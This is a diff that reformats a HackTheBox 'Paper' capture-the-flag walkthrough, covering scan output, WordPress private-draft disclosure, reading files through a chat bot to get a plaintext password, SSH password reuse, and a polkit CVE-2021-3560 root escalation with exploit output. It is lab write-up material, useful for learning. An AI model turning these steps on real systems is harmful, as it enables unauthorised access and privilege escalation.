@@ -6,15 +6,12 @@ categories:
   - HackTheBox
 ---
 
-
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT    STATE SERVICE  REASON  VERSION
 22/tcp  open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
 |   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
@@ -26,16 +23,16 @@ PORT    STATE SERVICE  REASON  VERSION
 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
 |_http-title: HTTP Server Test Page powered by CentOS
-| http-methods: 
+| http-methods:
 |   Supported Methods: GET POST OPTIONS HEAD TRACE
 |_  Potentially risky methods: TRACE
 
 443/tcp open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
 |_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
+| tls-alpn:
 |_  http/1.1
 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
-| http-methods: 
+| http-methods:
 |   Supported Methods: GET POST OPTIONS HEAD TRACE
 |_  Potentially risky methods: TRACE
 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
@@ -80,10 +77,8 @@ PORT    STATE SERVICE  REASON  VERSION
 | mh/ptg==
 |_-----END CERTIFICATE-----
 
-```
-### Gobuster
+```bash
 
-```
 /.hta                 (Status: 403) [Size: 199]
 /.htaccess            (Status: 403) [Size: 199]
 /.htpasswd            (Status: 403) [Size: 199]
@@ -95,24 +90,23 @@ PORT    STATE SERVICE  REASON  VERSION
 /.htaccess            (Status: 403) [Size: 199]
 /.htpasswd            (Status: 403) [Size: 199]
 /developer            (Status: 301) [Size: 247] [--> http://10.129.148.234/manual/developer/]
-/faq                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/faq/]      
-/howto                (Status: 301) [Size: 243] [--> http://10.129.148.234/manual/howto/]    
-/images               (Status: 301) [Size: 244] [--> http://10.129.148.234/manual/images/]   
-/index.html           (Status: 200) [Size: 9164]                                             
-/LICENSE              (Status: 200) [Size: 11358]                                            
-/misc                 (Status: 301) [Size: 242] [--> http://10.129.148.234/manual/misc/]     
-/mod                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/mod/]      
-/programs             (Status: 301) [Size: 246] [--> http://10.129.148.234/manual/programs/] 
-/ssl                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/ssl/]      
-/style                (Status: 301) [Size: 243] [--> http://10.129.148.234/manual/style/] 
+/faq                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/faq/]
+/howto                (Status: 301) [Size: 243] [--> http://10.129.148.234/manual/howto/]
+/images               (Status: 301) [Size: 244] [--> http://10.129.148.234/manual/images/]
+/index.html           (Status: 200) [Size: 9164]
+/LICENSE              (Status: 200) [Size: 11358]
+/misc                 (Status: 301) [Size: 242] [--> http://10.129.148.234/manual/misc/]
+/mod                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/mod/]
+/programs             (Status: 301) [Size: 246] [--> http://10.129.148.234/manual/programs/]
+/ssl                  (Status: 301) [Size: 241] [--> http://10.129.148.234/manual/ssl/]
+/style                (Status: 301) [Size: 243] [--> http://10.129.148.234/manual/style/]
 
 ```
 
-AS I don't trust hackthebox alot I added nikto to my enumeration process
+As I don't trust hackthebox alot I added nikto to my enumeration process
 
-### nikto
 
-```
+```bash
 ---------------------------------------------------------------------------
 + Target IP:          10.129.148.234
 + Target Hostname:    10.129.148.234
@@ -125,7 +119,7 @@ AS I don't trust hackthebox alot I added nikto to my enumeration process
 + Uncommon header 'x-backend-server' found, with contents: office.paper
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Retrieved x-powered-by header: PHP/7.2.24
-+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE
 + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
 + OSVDB-3092: /manual/: Web server manual found.
 + OSVDB-3268: /icons/: Directory indexing found.
@@ -144,7 +138,7 @@ I add `office.paper` to my `/etc/hosts` and can access the real website (instead
 
 Damn I love "the office"
 
-```
+```text
 Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
 -Nick
 ```
@@ -152,7 +146,7 @@ Michael, you should remove the secret content from your drafts ASAP, as they are
 
 As it is proudly powered by wordpress I go for a wpscan
 
-```
+```bash
 +] Headers
  | Interesting Entries:
  |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
@@ -209,14 +203,13 @@ As it is proudly powered by wordpress I go for a wpscan
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)
 
-
 ```
 
-I also found alot of wordpress vulnerablities for this version 
+I also found alot of wordpress vulnerabilities for this version
 
 but this one is relevant to Nick's comment
 
-```
+```bash
  | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
  |     Fixed in: 5.2.6
  |     References:
@@ -230,9 +223,7 @@ but this one is relevant to Nick's comment
 ```
 Google it to understand this `http://office.paper/?static=1`
 
-```
-
-
+```text
 # Warning for Michael
 
 Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
@@ -255,7 +246,6 @@ http://chat.office.paper/register/8qozr226AhkCHZdyY
 
 # Also, stop looking at my drafts. Jeez!
 
-
 ```
 
 Add the new subdomain to your hosts and register to the given address
@@ -266,7 +256,7 @@ In the general chat you learn about `recyclops`
 
 its a cool bot designed by dwight, and it takes commands
 
-```
+```text
 ...
 
  <=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
@@ -292,7 +282,7 @@ ok I was mad confused when `.ssh` folder was empty but hey we love enumerating
 
 so...in the `hubot` folder
 
-```
+```text
  <!=====Contents of file ../hubot/.env=====>
 export ROCKETCHAT_URL='http://127.0.0.1:48320'
 export ROCKETCHAT_USER=recyclops
@@ -307,7 +297,7 @@ export BIND_ADDRESS=127.0.0.1
 
 First i tried to ssh as "recyclops:Queenofblad3s!23"
 
-But it didnt work...wich confuses a bit more
+But it didnt work...which confuses a bit more
 
 But hey remember we can read /etc/passwd too
 
@@ -315,9 +305,9 @@ I check and there is a `dwight` user...and wo owns recyclops?
 
 Yeah that's right `dwight:Queenofblad3s!23`
 
-```
+```bash
 └──╼ $ssh dwight@10.129.148.234
-dwight@10.129.148.234's password: 
+dwight@10.129.148.234's password:
 Activate the web console with: systemctl enable --now cockpit.socket
 
 Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
@@ -331,7 +321,7 @@ dwight_you_ignorant_time_thief
 
 ## Privilege escalation
 
-```
+```bash
 ...
 
 Sorry, user dwight may not run sudo on paper.
@@ -369,28 +359,19 @@ Sorry, user dwight may not run sudo on paper.
 ```
 
 Ok this was a very confusing part!
-
 This is what got me on tracks `/usr/lib/polkit-1/polkit-agent-helper-1`
-
 and checking the forums confirmed it
-
 also the author had the exploit on his github XD
-
-still...its was not obvious at all 
-
+still...its was not obvious at all
 kinda normal as this vlnerability isnt that easy to identify
-
 But it is old and If you used linpeas you probably did not miss it
- 
-Luckilly I already did two rooms about this on tryhackme
 
+Luckily I already did two rooms about this on tryhackme
 First I compiled and ran a C exploit for "pwnkit" but failed
-
-seems like the author patched that recently! 
+seems like the author patched that recently!
 
 its actually `CVE-2021-3560` that is meant to be used
-
-Not `CVE-2021-4034` (PWNKIT)...ha! 
+Not `CVE-2021-4034` (PWNKIT)...ha!
 
 You can do it manually then using `dbus-send` like in [here](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)
 
@@ -398,9 +379,9 @@ Or if you are kinda lazy too get a [github exploit](https://github.com/secnigma/
 
 Or you can write your own...
 
-'ey! your choice...me I chose lazyness 
+'ey! your choice...me I chose laziness this time
 
-```
+```bash
 [dwight@paper tmp]$ touch exploit.py
 [dwight@paper tmp]$ nano exploit.py
 [dwight@paper tmp]$ python exploit.py
@@ -410,10 +391,10 @@ bash: python: command not found...
 **************
 Exploit: Privilege escalation with polkit - CVE-2021-3560
 Exploit code written by Ahmad Almorabea @almorabea
-Original exploit author: Kevin Backhouse 
+Original exploit author: Kevin Backhouse
 For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
 **************
-[+] Starting the Exploit 
+[+] Starting the Exploit
 id: 'ahmed': no such user
 id: 'ahmed': no such user
 id: 'ahmed': no such user
@@ -433,7 +414,7 @@ Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedeskt
 
 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
 [+] Timed out at: 0.007874564154874596
-[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 
+[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root
 
 We trust you have received the usual lecture from the local System
 Administrator. It usually boils down to these three things:
@@ -450,15 +431,12 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Now I am ahmed and I can root! look at me go!
 
-```
+```bash
 [root@paper tmp]# cd /root
 [root@paper ~]# ls
 anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
 [root@paper ~]# cat root.txt
 polkit_flag_from_prisonmike
-[root@paper ~]# 
+[root@paper ~]#
 ```
 Damn! those "easy" rooms on hackthebox make me feel more stupid than usual
-
-
-
